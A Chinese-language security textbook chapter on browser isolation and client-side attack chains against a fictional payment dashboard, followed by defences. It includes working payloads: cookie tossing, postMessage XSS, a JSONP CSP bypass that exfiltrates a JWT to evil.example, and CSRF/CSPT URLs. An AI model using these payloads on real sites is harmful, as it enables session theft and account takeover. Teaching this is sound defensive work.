# 第 10 章：瀏覽器安全模型與客戶端攻擊鏈

許多後端工程師把瀏覽器當成單純的 HTTP 客戶端：送出請求、收到 JSON、把畫面畫出來。這種想法在單一系統內部看似無害，卻低估了瀏覽器身為「多租戶執行環境」的複雜度。使用者的瀏覽器同時開著幾十個互不信任網域的分頁，而且在同一個執行環境裡保管著最高權限的憑證——Session Cookie、`localStorage`、OAuth Token 與跨視窗參照。

一旦客戶端的安全邊界失守，攻擊者根本不需要碰你的伺服器記憶體或資料庫解析器。他們只要讓受害者的瀏覽器跑一段受控腳本，或是騙瀏覽器在錯誤的上下文裡自動附上憑證，就能直接冒用受害者身分操作 NexusPay 商戶後台，完成提領、竄改結算設定，或偷走有效期 `900 s` 的短期 JWT。本章就從瀏覽器最底層的隔離模型出發，一步步拆解 SOP、CORS、DOM XSS、`postMessage`、CSP、CSRF 與 XS-Leaks 是怎麼被串成完整帳號接管鏈的。

---

## 從你已知的出發

為什麼後端 API 明明鎖好了認證、伺服器也沒有半點漏洞，商戶只要在另一個分頁點開一封釣魚推廣信，NexusPay 後台的設定就會被靜默竄改，連存在 `localStorage` 裡的 JWT 都被整包偷走？

因為**瀏覽器的同源政策（SOP，Same-Origin Policy）不像容器的 Linux Namespaces 那樣預設封死所有跨界連線**。雖然現代瀏覽器會照 `(scheme, host, port)` 三元組把不同站點丟進獨立的渲染行程（Renderer Process），禁止外站直接讀取 `https://app.nexuspay.example` 的 DOM 或 `fetch()` 回應；但瀏覽器在三個地方留了預設敞開的大門：第一，它**預設允許跨來源「發送」請求與嵌入資源**（SOP 擋的是跨源「讀取」，不是跨源「寫入」）；第二，它會**自動幫跨站請求附上符合網域規則的 Cookie**（Ambient Authority）；第三，HTML 資料與 JS 程式碼混在同一個 DOM 平面裡，只要被塞進一段能執行的標籤或跨視窗 `postMessage`，隔離牆就會從內部徹底崩塌。

---

## 機制與推導

### 攻擊者目標與實質影響

客戶端與瀏覽器攻擊的核心，就是借刀殺人——在受害者已經登入的安全上下文（Security Context）裡執行非預期的操作：

第一種直接收益是**竊取會話憑證與冒用身分**。透過 DOM XSS 或繞過內容安全政策（CSP）注入惡意腳本，攻擊者可以直接在瀏覽器裡讀走暫存的短期 JWT（NexusPay 基準有效期為 `900 s`）或頁面上的敏感交易明細。

第二種是**跨站偽造操作與私有狀態側寫**。利用設錯的 CORS 標頭、CSRF 寬限期漏洞或跨站側通道（XS-Leaks），攻擊者可以在完全拿不到腳本執行權的前提下，探測受害者有沒有某筆大額交易，甚至逼瀏覽器自動幫受害者送出轉帳或改綁 Webhook 的請求。

一旦在前端拿到有效 Token 或建立受控的跨視窗通道，攻擊者就能無縫接軌後端 API，直接串起第 6 章的多租戶越權讀寫與第 12 章的業務邏輯雙花攻擊。

### 1. 同源政策（SOP）與 Cookie 作用域的致命落差

根據 RFC 6454，標準 `http` / `https` 網址的**來源**（Tuple Origin）是由 `(scheme, host, port)` 三元組嚴格決定的。兩個網址必須在協定、主機名稱與有效連接埠三者完全一模一樣時，才叫做**同源**（`Same-Origin`）。至於 `data:` 網址或是沒加 `allow-same-origin` 的 `<iframe sandbox>`，瀏覽器則會發給它一個獨一無二的**不透明來源**（`Opaque Origin`）：它跟世界上任何來源（甚至另一個同樣長相的沙箱 iframe）都不相等，而轉成字串時一律印出字面上的 `"null"`。

只要三元組裡面有一項對不上，瀏覽器就會擋下跨視窗的 DOM 存取與預設的 `fetch()` 回應讀取：

| 比較目標 URL | 與 `https://app.nexuspay.example:443` 的關係 | 為什麼不同源 |
|---|---|---|
| `https://app.nexuspay.example/dashboard` | **同源**（`Same-Origin`） | 三元組完全相同（`https` 預設埠就是 `443`） |
| `http://app.nexuspay.example/dashboard` | **跨來源**（`Cross-Origin`） | 協定 `scheme` 不同（`http` vs `https`） |
| `https://api.nexuspay.example/v1/balance` | **跨來源**（`Cross-Origin`） | 主機 `host` 不同（子網域不同就算跨源！） |
| `https://app.nexuspay.example:8443/` | **跨來源**（`Cross-Origin`） | 連接埠 `port` 不同（`443` vs `8443`） |

早期瀏覽器曾經留了一個後門叫 `document.domain`，讓 `app.nexuspay.example` 跟 `api.nexuspay.example` 可以各自在 JS 裡把 `document.domain` 改寫成父網域 `"nexuspay.example"` 來互通 DOM。因為這個老設計嚴重破壞了 Site Isolation 的行程隔離邊界，現代 Chromium 瀏覽器已經預設啟用 `Origin-Agent-Cluster` 並廢除了 `document.domain` 降級功能（除非伺服器刻意回傳 `Origin-Agent-Cluster: ?0`）。

但瀏覽器身上最危險的歷史包袱，是 **Cookie 的附送規則根本不管你的三元組 Origin！**

瀏覽器決定要不要在請求裡帶上一顆 Cookie，看的是另外兩套完全不同的標準：
1. **Cookie 自身的 `Domain`、`Path` 與 `Secure` 屬性**：最扯的是，Cookie **完全不區分連接埠（Port）**！就算你用了最嚴格的 `__Host-` 前綴（強制 `Secure`、`Path=/` 且不設 `Domain` 鎖死當前主機），同台主機上 `:8443` 埠跑的測試服務一樣能收到 `:443` 主站的 Cookie。
2. **「同站」（Same-Site）與「跨站」（Cross-Site）的判定**：請把這句話刻在心裡——**「同站」比「同源」寬鬆太多了！** 現代瀏覽器判定是否同站，看的是「協定（Scheme）＋ 可註冊網域（`eTLD+1`，依 Public Suffix List 決定）」。

這意味著什麼？`https://promo.nexuspay.example`（行銷外包活動頁）跟 `https://app.nexuspay.example`（核心商戶後台）雖然**不同源**，但在瀏覽器眼裡卻是百分百的**同站**（Same-Site）！

一旦那個防護薄弱的 `promo` 行銷子網域被打出 XSS 或被子網域接管（Subdomain Takeover），攻擊者就能在上面執行一行：
`document.cookie = "csrf_token=attacker_val; Domain=.nexuspay.example; Path=/"`
這招叫做 **Cookie Tossing**（跨子網域投毒）。當受害者接著打開核心主站 `app.nexuspay.example` 時，瀏覽器會把這顆綁在父網域的假 Cookie 一併送給主站（甚至跟主站原有的同名 Cookie 並排送出）；只要主站沒用 `__Host-` 前綴鎖死 Cookie 來源，後端就很容易讀到攻擊者塞進來的假 Token，當場造成會話固定或 CSRF 防線崩潰。

---

### 2. CORS 錯誤配置與信任委託破口

既然 `https://app.nexuspay.example` 跟 `https://api.nexuspay.example` 屬於不同源，當前後端分離的 SPA 需要去讀 API 回傳的 JSON 時，後端就得透過 **CORS**（Cross-Origin Resource Sharing）回應標頭明確授權。

WHATWG Fetch 規範把跨來源請求分成兩條路：

第一條路叫**簡單請求**（Simple Request）：只要 HTTP 方法是 `GET`、`HEAD` 或 `POST` 其中之一，而且沒有自訂特殊標頭（`Content-Type` 也僅限傳統表單的 `application/x-www-form-urlencoded`、`multipart/form-data` 或 `text/plain`），瀏覽器**會直接把請求送給後端伺服器**，等拿到回應之後，才看裡面的 `Access-Control-Allow-Origin`（ACAO）標頭准不准前端 JS 讀取內容。請特別注意：如果後端沒做防範、收到簡單請求就直接扣款或改狀態，就算瀏覽器最後因為沒有 ACAO 標頭而擋下回應不給 JS 看，後端的資料庫早就已經被改完了！

第二條路叫**預檢請求**（Preflight Request）：只要你用了 `PUT` / `DELETE`、加了 `Authorization` 標頭，或是把 `Content-Type` 設成 `application/json`，在沒有預檢快取（`Access-Control-Max-Age`）時，瀏覽器一定會先發一筆 `OPTIONS` 請求問後端「你准不准這個來源用這些方法與標頭打過來？」，後端回傳 `Access-Control-Allow-Methods` 與 `Access-Control-Allow-Headers` 點頭答應後，真正的請求才會送出去。

在實戰 Code Review 裡，CORS 之所以會變成高危資料外洩漏洞，99% 都是因為後端開發者為了嫌麻煩，把 `Origin` 白名單驗證寫壞了：

- **無條件反射 `Origin` 還開 `Credentials: true`**：因為規範禁止 `Access-Control-Allow-Origin: *` 搭配 `Access-Control-Allow-Credentials: true` 一起用，有些開發者為了「讓所有前端都能連」，就寫出 `res.setHeader("Access-Control-Allow-Origin", req.headers.origin)`。這等於對全世界敞開大門——只要受害者的 Session Cookie 符合跨站附送條件（例如設了 `SameSite=None; Secure`，或是從同站子網域發起請求），任何網站都能用 `fetch(..., { credentials: "include" })` 直接把商戶的帳本餘額跟金鑰讀走。
- **把 `"null"` 放進允許的 Origin 白名單**：有些工程師在本機用 `file://` 測試網頁時看到 `Origin: null`，就順手把 `"null"` 加進生產環境的 CORS 白名單。殊不知在 HTML 規範裡，任何惡意網站只要放一個 `<iframe sandbox="allow-scripts">`（不加 `allow-same-origin`）或用 `data:` URI，裡面發出的所有 `fetch()` 請求，其 `Origin` 標頭全部都是字面上的 `"null"`！這等於讓全世界任何網站都能套個沙箱 iframe 偷看你的 API 回應。
- **偷懶的字串前綴／後綴與正規表達式陷阱**：例如寫成 `origin.endsWith("nexuspay.example")`，忘了檢查前面必須有句點 `.`，結果攻擊者註冊一個 `https://evilnexuspay.example` 就直接過關；又或者寫成 `^https://.*\.nexuspay\.example$` 無條件信任所有子網域，一旦某個老舊的同站子網域被打出 XSS（這時連 `SameSite=Lax` 甚至 `Strict` 的共用 Cookie 都能暢行無阻地帶過去！），整個核心 API 就跟著陪葬。

---

### 3. DOM XSS 與 `postMessage` 跨視窗通訊破口

傳統的反射型或儲存型 XSS，是後端在組裝 HTML 時忘了跳脫危險字元；而 **DOM XSS** 則是前端自己的 JavaScript 把不可信的外部輸入（Source），一路沒洗乾淨就塞進了瀏覽器的危險執行匯點（Sink）裡。當這個 Source 是像網址井字號後面的 `location.hash`（Fragment 不會隨 HTTP 請求送到伺服器）或是跨視窗傳來的 `postMessage` 時，你買再貴的雲端 WAF 與後端日誌也完全看不到半點攻擊痕跡。

前端最常出事的 Source 包括 `location.search`、`location.hash`、`document.referrer`、`window.name`（跨網域跳轉後依然會保留原字串！）以及 `MessageEvent.data`；最致命的 Sink 則是會直接解析 HTML 的 `element.innerHTML`、`document.write()`、會執行程式碼的 `eval()` / `setTimeout(string)`，以及接受 `javascript:...` 偽協定的 `location.href` 與 `iframe.src`。

在現代 SPA 與第三方 OAuth 登入架構裡，**`window.postMessage` 是最容易被漏看的 DOM XSS 與 Token 外洩重災區**。

想像一下 NexusPay 商戶後台的 OAuth 彈窗登入流程：主視窗（`https://app.nexuspay.example`）呼叫 `window.open()` 彈出認證小視窗（`https://auth.nexuspay.example`）；使用者登入成功後，小視窗呼叫 `window.opener.postMessage({ type: "OAUTH_DONE", token }, targetOrigin)` 把 Token 傳回主視窗。這條跨視窗通道只要在接收端或發送端漏了一個檢查，就會立刻被打穿：

```javascript
// 破口 1：接收端沒檢查 event.origin，或只用 .includes() 模糊比對
window.addEventListener("message", (event) => {
  const payload = typeof event.data === "string" ? JSON.parse(event.data) : event.data;
  if (payload.type === "SET_NOTICE") {
    // 直接把任何視窗傳來的字串塞進 innerHTML 匯點！
    document.getElementById("banner").innerHTML = payload.html;
  }
});
```

1. **接收端忘了驗明正身（不查 `event.origin`）**：就像上面這段程式碼，主視窗完全沒檢查訊息是誰送來的。攻擊者只要在自己的惡意網頁上執行 `const w = window.open("https://app.nexuspay.example/dashboard")`，等頁面載入完畢後呼叫 `w.postMessage({ type: "SET_NOTICE", html: "<img src=x onerror=...>" }, "*")`，就能隔空把 XSS Payload 送進受害者視窗的 `innerHTML` 裡。請注意：就算你加了 `X-Frame-Options: DENY` 禁止別人用 `<iframe>` 嵌你的網頁，只要你沒設定 `Cross-Origin-Opener-Policy: same-origin`（COOP），跨站用 `window.open()` 開出來的新分頁照樣拿得到視窗參照（Window Reference），照樣能對它狂發 `postMessage`！
2. **發送端偷懶用萬用字元 `targetOrigin = "*"`**：反過來，如果認證彈窗在把剛簽好的 JWT 傳回給 `window.opener` 時，第二個參數偷懶寫成 `"*"`（`window.opener.postMessage({ token }, "*")`），攻擊者就可以先在惡意網頁上用 `window.open()` 打開你的登入流程，或者利用跨視窗跳轉把 `opener` 換成自己的網域，當場把熱騰騰的 Token 攔截走。

---

### 4. CSP（內容安全政策）剖析與白名單繞過實算

就算前端不幸出現了 HTML 注入點，瀏覽器還提供了最後一道防線：**內容安全政策**（Content Security Policy，簡稱 **CSP**）。伺服器可以透過 `Content-Security-Policy` 回應標頭下令：「不准執行寫在 HTML 裡面的 inline `<script>`，也不准載入非指定網域的外部腳本或圖片。」

聽起來很美好，但為什麼現實中一大堆設了「網域白名單 CSP（Allowlist CSP）」的網站還是被輕鬆繞過？因為工程師常忽略了 CSP Level 3 規範裡的三個結構性死穴：

1. **白名單網域上的 JSONP 與前端框架 Gadget**：很多團隊設了 `script-src 'self' https://cdn.example.com`，以為擋掉了 inline script 就萬無一失。但只要你允許的 `'self'` 或那個公共 CDN 上面，找得到任何一支會回傳 `callback({...})` 的舊版 JSONP API，或是託管了像舊版 AngularJS / Vue 這類會在 DOM 裡面自己掃描並執行模板表達式的前端框架檔案，攻擊者只要注入一行 `<script src="https://cdn.example.com/angular.min.js"></script>` 或是 `<script src="/api/jsonp?callback=...">`，連半個字元的 inline script 都不用寫，就能在完全符合 CSP 白名單的狀態下執行任意 JS！
2. **HTTP 302 重導向時「自動忽略路徑限制」的規範陷阱**：就算你在 `script-src` 把路徑鎖死在 `https://static.nexuspay.example/v1/safe/`，**只要同站或另一個白名單網域上有任何一個開放重導向（Open Redirect），這條路徑限制就會當場失效！** 根據 **W3C CSP Level 3 規範 §6.2（Matching Source Expressions）**，為了防止透過 CSP 路徑規則探測跨站重導向後的機密 URL 路徑，瀏覽器在遇到 HTTP 重導向後，**對重導向目標會直接跳過路徑（path）比對，只檢查 `scheme`、`host` 與 `port` 有沒有在白名單裡**。只要從白名單裡的 `/redirect?to=https://static.nexuspay.example/legacy/vulnerable.js` 跳過去，原本鎖死的 `/v1/safe/` 路徑限制就形同虛設。
3. **忘了鎖 `base-uri` 與頂層導航外洩**：如果頁面是用相對路徑載入腳本（如 `<script src="/js/app.js">`），而 CSP 忘了設 `base-uri 'none'` 或 `'self'`，攻擊者只要在頁面上插一行 `<base href="https://evil.example/">`，後面所有的相對路徑腳本就會全部跑去攻擊者的伺服器下載！此外，就算你用 `default-src 'self'`（連帶鎖死 `connect-src` 與 `img-src`）封死了 `fetch()` 與 `new Image()` 外連，只要攻擊者拿到 JS 執行權，直接執行 `location.href = "https://evil.example/?" + secret` 觸發**頂層頁面導航**（Navigation），`default-src` 與 `connect-src` 是完全擋不住的！

下面我們直接拿 NexusPay 商戶後台 `/merchant/profile` 的真實審計場景，一字一字推算怎麼在嚴格字數限制下繞過它的白名單 CSP 並偷出 778 字元的 JWT：

```text
=== Worked Example：拆解 NexusPay 白名單 CSP 並實算 JSONP 繞過與 JWT 外洩 ===

[1] 目標環境與基準參數
- 受測頁面回應的 CSP 標頭（標頭值字串本身共 98 bytes）：
  Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.nexuspay-static.example/libs/; object-src 'none'
- 注入點能力：可注入任意 HTML 標籤，但 inline <script> 與 onerror=... 皆被 CSP 攔截。
- 目標機密：存放在 localStorage.getItem("nexus_jwt") 的商戶 JWT（RS256 2048-bit RSA，簽發效期 900 s）。
  JWT 長度精算：Header (36 chars) + Payload (398 chars) + 256-byte RSA 簽章無填充 Base64URL (342 chars) + 2 個句點 "."
              = 36 + 398 + 342 + 2 = 778 chars。
- 盤點白名單 ('self' 與 https://cdn.nexuspay-static.example/libs/) 可用資源：
  (A) CDN 上有 angular-1.6.9.min.js
  (B) 同源 ('self') 有一支舊版報表 JSONP 端點：/api/v1/merchants/export?callback=<fn>
      回傳 Content-Type: application/javascript 與 <fn>({"status":"ok"})
      後端限制：過濾 '<' 與 '>'，且 callback 參數長度上限 <= 64 chars。

[2] 路線評估一：嘗試白名單 CDN 的 AngularJS Gadget（為何在此 CSP 下會失敗？）
- 嘗試注入兩行標籤（分別為 85 bytes 與 107 bytes，合計 192 bytes；含中間 1 個 LF 換行共 193 bytes）：
  <script src="https://cdn.nexuspay-static.example/libs/angular-1.6.9.min.js"></script>
  <div ng-app ng-csp>{{$on.constructor("location='https://evil.example/x?'+localStorage.nexus_jwt")()}}</div>
- 執行結果：腳本載入成功（符合 41 bytes 的前綴 https://cdn.nexuspay-static.example/libs/），
  但在求值 $on.constructor(...) 時拋出 EvalError 被瀏覽器攔截！
- 失敗根因：$on.constructor 就是 JavaScript 的 Function 建構子，在 CSP 下等同於呼叫 eval()；
  而本題的 script-src 並沒有開啟 'unsafe-eval'，所以這條路走不通！

[3] 路線評估二：切換為同源 JSONP 端點（完全不需 'unsafe-eval'）
- 由於 script-src 包含 'self'，我們可以直接載入 /api/v1/merchants/export?callback=... 當作腳本執行。
- 外洩通道限制：因為 default-src 'self' 連帶把 connect-src 與 img-src 都鎖在同源，呼叫 fetch() 或 new Image() 外帶都會被擋下。
  但頁面頂層導航（對 location 賦值）不受 default-src / connect-src 管轄！
- 構造 <= 64 字元的 callback 外洩 Payload：
  location='//evil.example/?'+localStorage.nexus_jwt
  長度驗算："location='//evil.example/?'+localStorage.nexus_jwt" 剛好 50 chars (<= 64 chars 上限，且不含 '<' 或 '>')！

[4] 最終注入標籤與外洩 URL 長度驗算
- 注入 HTML（將 '+' 做 URL 編碼為 %2B，並在尾端加上 ;// 註解掉後面緊接的 ({"status":"ok"})）：
  <script src="/api/v1/merchants/export?callback=location='//evil.example/?'%2BlocalStorage.nexus_jwt;//"></script>
- 後端 JSONP 端點實際回傳的 JS 程式碼：
  location='//evil.example/?'+localStorage.nexus_jwt;//({"status":"ok"})
- 瀏覽器執行與外洩請求驗算：
  1. 命中 script-src 'self'，合法載入執行；一般賦值與字串相加完全不需 'unsafe-eval'。
  2. 觸發頂層導航跳往 https://evil.example/?<JWT>。
  3. 外洩 GET 請求完整 URL 長度 = "https://evil.example/?" (22 chars) + JWT (778 chars) = 800 chars。
     遠小於主流伺服器請求行上限（如 Nginx 預設 large_client_header_buffers 8 KiB = 8,192 bytes），
     僅需 1 次導航請求，這枚有效期 900 s 的完整 JWT 就原封不動進了攻擊者口袋！
```

看完這個實算，以後審計 CSP 時千萬別看到沒有 `'unsafe-inline'` 就放過它。只要抓準三個問題——**有沒有開 `'unsafe-eval'`？`'self'` 跟白名單 CDN 上有沒有 JSONP 或舊檔案？能不能用 `location` 導航把資料帶出去？**——九成以上的白名單 CSP 都能被當場拆穿。

---

### 5. CSRF、`SameSite=Lax` 的 120 秒後門與 CSPT（客戶端路徑穿越）

以前打 **CSRF**（Cross-Site Request Forgery，跨站請求偽造）非常容易，因為不管哪個網站寫了一個隱藏表單 `<form action="https://api.nexuspay.example/withdraw" method="POST">` 自動送出，瀏覽器都會傻傻地把受害者的 Session Cookie 一起帶過去。自從 Chrome 80 把沒寫 `SameSite` 屬性的 Cookie 預設值改成 `SameSite=Lax` 之後，跨站表單 `POST` 與跨站 `fetch` 預設都不再帶 Cookie，很多人因此以為 CSRF 已經絕跡了。

但實戰中，`SameSite=Lax` 留了三個大破口：

1. **Chromium 的「120 秒 `Lax + POST` 寬限期例外」**：當後端在 `Set-Cookie` 時**偷懶沒有明確寫出 `SameSite=Lax` 字樣**，而是靠瀏覽器自動套用預設的 `Lax` 時，Chromium 系瀏覽器為了相容老舊的 SSO 登入跳轉（例如 SAML 認證完用跨站 `POST` 表單跳回主站），保留了一個 **2 分鐘（`120 秒`）的後門**：只要這顆未明確標註 `SameSite` 的 Cookie 剛建立（或剛被重新覆寫）還不滿 `120 秒`，跨站頂層 `<form method="POST">` 表單導航**照樣會把 Cookie 帶過去**！攻擊者只要先用 `window.open()` 戳一下目標網站的 SSO 自動重登端點刷新 Cookie，在接下來的 `120 秒` 內就能直接打穿跨站 `POST` CSRF。只要後端在 `Set-Cookie` 裡明確把 `SameSite=Lax` 寫出來，這個 120 秒後門就會立刻關上。
2. **用 `GET` 改狀態或開了 Method Override**：`SameSite=Lax` 為了讓外部超連結能正常維持登入狀態，預設允許**跨站頂層 `GET` 導航**（像點擊 `<a>` 連結或 `window.open()`）攜帶 Cookie。如果後端某支寫入 API 偷懶支援 `GET`，或是後端框架開了 `_method=POST` 查詢參數覆寫 HTTP 方法的功能，攻擊者只要把受害者導向 `https://api.nexuspay.example/withdraw?_method=POST&amount=10000`，`SameSite=Lax` 根本不會攔。
3. **同站子網域的橫向 CSRF**：回到前面第 1 節講的，只要攻擊者拿下了同一個 `eTLD+1` 底下的任何一個子網域（例如 `https://docs.nexuspay.example`），從那裡對 `https://api.nexuspay.example` 發出的任何請求都叫做**同站（Same-Site）請求**——這時候別說 `SameSite=Lax` 了，就算你設成最嚴格的 `SameSite=Strict`，只要 Cookie 的 `Domain` 涵蓋得到，瀏覽器一樣會把 Cookie 雙手奉上！

除了傳統直接打後端的 CSRF，現代前後端分離的 SPA 還衍生出了一種把「前端路由」變成攻擊跳板的新手法：**CSPT**（Client-Side Path Traversal，客戶端路徑穿越）。

看看下面這段前端 React/Vue 工程師天天在寫的程式碼——從網址列的查詢參數拿出 `id`，直接用樣板字串拼進 `fetch()` 的 API 路徑裡：

```javascript
// NexusPay 商戶前端：讀取網址 ?id=... 去拉發票明細
const params = new URLSearchParams(location.search);
const invoiceId = params.get("id");
fetch(`/api/v1/invoices/${invoiceId}`, { credentials: "include" })
  .then((r) => r.json())
  .then((data) => renderInvoice(data));
```

如果攻擊者傳給商戶一個連結：`https://app.nexuspay.example/invoice?id=../../admin/export-keys%23`，前端會發生什麼事？
第一步，`params.get("id")` 自動把 `%23` URL 解碼成井字號 `#`，拼進字串變成 `"/api/v1/invoices/../../admin/export-keys#"`；第二步，瀏覽器在發送 `fetch()` 之前，會照 WHATWG URL 規範自動正規化路徑——兩個 `..` 直接把前面的 `invoices` 跟 `v1` 兩層目錄消掉（後面就算原本還有接 `/details` 也會被 `#` 截斷成不會送出的 Fragment），最後瀏覽器實際打出去的請求竟然變成了 `GET /api/admin/export-keys`！

更可怕的是當 CSPT 串成 **CSPT2CSRF** 與 **CSPT2XSS**：
- **CSPT2CSRF**：如果前端頁面在載入或點個「確認預覽」按鈕時，會發送一筆帶有 `POST` 或 `DELETE` 的請求（例如 `fetch("/api/v1/drafts/" + id, { method: "POST" })`），攻擊者只要把網址上的 `id` 換成 `../withdrawals/execute`，就能騙受害者的前端頁面自己去打高權限的出金 API。因為這筆請求是**受害者自己的同源前端頁面親手發出來的**，它不只完美繞過 `SameSite=Strict` 與 `Origin` 檢查，要是你的前端 Axios Interceptor 還會自動幫所有同源請求塞上 `X-CSRF-Token` 標頭，它連 Anti-CSRF Token 都會幫攻擊者自動附好！
- **CSPT2XSS**：反過來，如果攻擊者利用 CSPT 把原本去拉乾淨發票資料的 `fetch()`，拐去拉另一個「內容由攻擊者控制」的同源 API（例如拉回攻擊者自己上傳的 JSON 設定或個人簡介），而前端拿到回應後沒檢查就直接塞進 `innerHTML` 或動態載入元件，一個單純的前端路徑拼接漏洞就當場升級成了 **DOM XSS**。

---

### 6. XS-Leaks（跨站側通道洩漏）推導

假設一個網站沒有半個 XSS、CORS 鎖得死死的、CSRF Token 也完全無法偽造，這樣跨站攻擊者是不是就對它束手無策了？

不一定。只要目標網站會根據「使用者有沒有登入」或「搜尋有沒有查到某筆帳務資料」，在頁面的小細節上表現出一點點可以被跨站觀測到的差異，攻擊者就能把瀏覽器當成一台「**1-bit 預言機**」（1-bit Oracle，每次回答是或否），一滴一滴把受害者的隱私側寫出來。這類手法統稱為 **XS-Leaks**（Cross-Site Leaks）：

1. **數 iframe 個數（`window.frames.length`）**：當惡意網站用 `window.open()` 或 `<iframe>` 打開 `https://app.nexuspay.example/search?q=10000`（假設目標 Cookie 會隨導航附上，且目標沒設 COOP 或 `frame-ancestors` 阻擋），雖然 SOP 禁止惡意網站偷看裡面的文字，但 **`win.frames.length`（也就是 `win.length`，代表該視窗裡面有幾個子 iframe）卻是規範允許跨站讀取的公開屬性**！如果 NexusPay 搜尋到交易紀錄時會在畫面嵌 1 個明細 iframe（`win.length === 1`），查無資料時不嵌（`win.length === 0`），攻擊者只要在惡意網頁裡不斷換關鍵字去測 `win.length`，就能把受害者有哪些客戶、交易了多少錢全部猜出來。
2. **狀態碼與 `onload` / `onerror` 事件差異**：如果某支敏感匯出 API 在有權限時回傳 `200 OK`，沒權限或查無此人時回傳 `404 Not Found` 或 `403 Forbidden`，攻擊者只要在自己的網頁上動態塞入 `<script>`、`<link rel="stylesheet">` 或 `<object>` 指向該網址，並綁定 `onload` 與 `onerror` 事件（搭配瀏覽器 CORB/ORB 或 `nosniff` 的攔截行為差異），就能從觸發了哪一個事件得知該筆資料存不存在。
3. **後端耗時的時間側通道（Timing Attack）**：前端可以用高精度的 `performance.now()` 去量跨站請求或導航花掉的毫秒數。如果搜尋 API 在「有查到資料」時要連表做複雜統計（後端耗時 `180 ms`），「查無資料」時立刻提早返回（後端耗時 `15 ms`，兩者足足差了 `165 ms`），攻擊者只要多測幾次取平均把網路抖動洗掉，就能靠時間長短猜出答案。（至於早期靠著量測跨站靜態圖片載入是 `< 5 ms` 還是 `> 40 ms` 來偷看使用者瀏覽歷史的快取探測手法，現代瀏覽器已經透過 **HTTP Cache Partitioning** 按頂層網站切分快取擋掉了，但後端本身運算時間差的側通道依然完全有效。）

---

## 故障模式與防禦

看懂瀏覽器端這六種環環相扣的攻擊鏈後，我們就能明白為什麼「出一個洞、補一個正規表達式」在前端永遠補不完。真正耐打的客戶端防禦，必須靠下面三套架構級的機制把邊界一次鎖死。

### 故障模式 1：迷信網域白名單 CSP，並靠人工到處塞 `DOMPurify`

很多團隊花大力氣維護一長串 `script-src 'self' https://cdn1... https://cdn2...` 白名單，同時規定前端工程師每次用 `innerHTML` 前都要自己記得呼叫 `DOMPurify.sanitize()`。結果業務一忙，只要同源多了一支 JSONP 或舊版 JS 檔，白名單 CSP 就被穿破；只要一百個元件裡有一個新人忘了包 `DOMPurify`，全站就宣告失守。

**架構級防禦**：
1. **全面改用 Nonce-based Strict CSP**：拋棄脆弱的網域白名單！每次伺服器回傳 HTML 時，都用密碼學安全亂數產生器（CSPRNG）當場生一組至少 `128 bits`（`16 bytes` 原始亂數，轉成 Base64 後是 `24` 個字元）的單次隨機數 `nonce`，回傳標頭：
   `Content-Security-Policy: script-src 'nonce-<隨機值>' 'strict-dynamic'; object-src 'none'; base-uri 'none'`
   這裡的 `'strict-dynamic'` 非常聰明，它允許已經拿到合法 `nonce` 的主程式動態載入其他子模組，你再也不用手動維護 CDN 網域清單；而 `base-uri 'none'` 則一舉封死了 `<base>` 標籤劫持。但請記住一條鐵律：**絕對不能讓 CDN 或反向代理把帶有固定 Nonce 的 HTML 頁面快取起來重放給別人**（必須加上 `Cache-Control: no-store` 或在邊緣節點每次動態換新 Nonce），否則一旦固定 Nonce 外洩，攻擊者就能自己拼出帶相符 `nonce` 的 `<script>` 標籤！
2. **啟用 Trusted Types 鎖死所有 DOM XSS 匯點**：在 CSP 裡加上 `require-trusted-types-for 'script'`。開啟之後，只要前端程式碼敢把一個普通的 `string` 直接塞進 `innerHTML`、`document.write`、`script.src` 或 `eval`，瀏覽器就會當場拋出 TypeError 拒絕執行！所有要進危險匯點的資料，都必須先通過你集中定義的 `TrustedTypePolicy`（例如在 Policy 裡統一強制跑過 `DOMPurify.sanitize()` 轉成 `TrustedHTML` 型別）。這樣做的好處是把全站幾萬行前端程式碼的 XSS 審查，瞬間收斂到那幾十行的 Policy 定義檔上。

### 故障模式 2：只靠預設 `SameSite` 防 CSRF，CORS 用正規表達式亂配

如果後端只靠瀏覽器預設的 `SameSite`（沒寫出屬性字串）、也沒檢查請求到底是從哪來的，就會被前面講的 120 秒 `Lax + POST` 後門或同站子網域打穿；而用正規表達式寫 CORS `Origin` 檢查或允許 `"null"`，更是定時炸彈。

**架構級防禦**：
1. **部署 Fetch Metadata（`Sec-Fetch-*`）中介層**：現代瀏覽器發請求時，都會自動帶上前端 JS 絕對無法偽造的 `Sec-Fetch-Site`（值只有四種：`same-origin`、`same-site`、`cross-site`、`none`）、`Sec-Fetch-Mode` 與 `Sec-Fetch-Dest` 標頭。我們可以在後端閘道寫一個十幾行的全域 Resource Isolation 中介層：只要是改變狀態的請求（`POST` / `PUT` / `PATCH` / `DELETE`）或敏感 API，看到 `Sec-Fetch-Site === "cross-site"`（甚至跨子網域的 `"same-site"`）一律當場回傳 `403 Forbidden`，連跨站表單 `navigate` POST 都不放過！
2. **明確寫出 Cookie 屬性並加上 `__Host-` 前綴**：發 Session Cookie 時，一定要明確印出 `Set-Cookie: __Host-sid=...; HttpOnly; Secure; Path=/; SameSite=Lax`（高敏操作可改用 `SameSite=Strict`）。明確寫出 `SameSite=Lax` 會立刻關掉 Chromium 的 120 秒寬限期後門；加上 `__Host-` 前綴則強迫該 Cookie 絕對不准設 `Domain`，徹底免疫同站子網域的 Cookie Tossing 投毒。同時，所有寫入 API 都應該強制檢查 `Content-Type: application/json` 並搭配綁定 Session 的 Anti-CSRF Token。
3. **CORS 改用精確 Set 查表**：把正規表達式丟掉，直接用 `const ALLOWED_ORIGINS = new Set(["https://app.nexuspay.example"])` 做全等查表，而且永遠不准對 `"null"` 回傳 `Access-Control-Allow-Credentials: true`。

### 故障模式 3：`postMessage` 來者不拒、前端亂拼 API 路徑與缺少跨站隔離標頭

**架構級防禦**：
1. **`postMessage` 雙向嚴格契約**：發送機密訊息時，第二個參數 `targetOrigin` 必須寫死完整來源（如 `"https://app.nexuspay.example"`），嚴禁寫 `"*"`；接收端第一行必須做全等檢查 `if (event.origin !== "https://auth.nexuspay.example") return;`，如果是彈窗流程還要核對 `event.source === authPopup` 以及當次登入的隨機 `state`，最後拿到的資料只准用 `textContent` 或安全狀態綁定渲染，絕不直接丟進 `innerHTML`。
